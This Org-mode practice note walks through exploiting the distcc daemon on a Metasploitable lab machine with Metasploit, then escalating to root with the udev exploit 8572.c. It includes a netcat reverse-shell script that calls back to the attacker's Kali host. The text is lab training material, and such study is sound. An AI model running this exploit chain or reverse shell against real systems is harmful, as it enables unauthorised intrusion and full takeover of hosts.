#+title:Exploitation Documentation
#+author: Touhidul Shawan
#+description: This file is used to document various type of exploitation with msfconsole [practice purpose only]

* DistCC Daemon Command Execution
#+begin_SRC text
step by step guide to exploit *distcc command execution with privilege escalation
#+end_SRC
** Steps
1. Open a terminal [marked as *terminal1*] & run *msfconsole*
    #+begin_src bash
    sudo msfconsole
    #+end_src
2. Search for *distcc*
    #+begin_src bash
    search distcc
    #+end_src
3. Select first one
    #+begin_src bash
    use exploit/unix/misc/distcc_exec
    #+end_src
    or
    #+begin_src bash
    use 0
    #+end_src
4. Show detailed options
    #+begin_src bash
    options
    #+end_src
5. Set RHOST which the target host [in our case it is metasploitable]
   + change *192.168.0.5* to your metasploitable machine ip
    #+begin_src bash
    set RHOST 192.168.0.5
    #+end_src
6. Change the payload
   + You can show all the payloads for current exploit by typing
     #+begin_src bash
     show payloads
     #+end_src
7. Select correct payload
     #+begin_src bash
     set payload cmd/unix/reverse
     #+end_src
8. Run the exploit
   you can type *run* or *exploit*
    #+begin_src bash
    run
    #+end_src
*Keep open that terminal1*

** Privilege Escalation of distcc command execution with Udev exploit
Open a new terminal or new tab on existing open terminal1 in your *Kali* linux
You can find exploit with *searchsploit*
#+begin_src bash
searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6
#+end_src
We will use this exploit
#+begin_src text
Linux Kernel 2.6 (Gentoo / Ubuntu 8.10/9.04) UDEV < 1.4.1 -  | linux/local/8572.c
#+end_src
We will serve this *8572.c* file to compromised metasploitable machine
1. Start the *apache* server
    #+begin_src bash
    sudo systemctl start apache2
    #+end_src
2. Copy *8572.c* file to */var/www/html/ directory
    #+begin_src bash
    sudo cp /usr/share/exploitdb/exploits/linux/local/8572.c /var/www/html/
    #+end_src
3. This exploit will execute the */tmp/run* file on the target, so we need to make it
    #+begin_src bash
    sudo vi /var/www/html/run
    #+end_src
Paste this code on that run file
Replace *192.168.0.8* with your kali linux ip and *5555* port as your wish [where you want to get back the connection]
    #+begin_src bash
    #!/bin/bash
    nc 192.168.0.8 5555 -e /bin/bash
    #+end_src

4. Restart the apache server
#+begin_src bash
sudo systemctl restart apache2
#+end_src

5. Now  go that terminal1
